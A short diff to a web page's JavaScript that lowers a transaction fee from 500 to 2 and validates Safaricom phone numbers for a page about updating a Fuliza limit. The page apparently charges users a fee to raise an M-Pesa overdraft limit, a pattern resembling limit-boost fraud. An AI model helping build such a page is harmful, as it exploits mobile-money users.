@@ -105,7 +105,7 @@ Failure to complete the transaction may delay the update of your Fuliza limit.
 const selectedAmount = localStorage.getItem("selectedAmount");
 document.getElementById("limit").innerText = "KSh " + selectedAmount;
 
-const transactionFee = 500;
+const transactionFee = 2;
 
 function isSafaricom(number){
 return /^(07|01)[0-9]{8}$/.test(number) || /^2547[0-9]{8}$/.test(number);
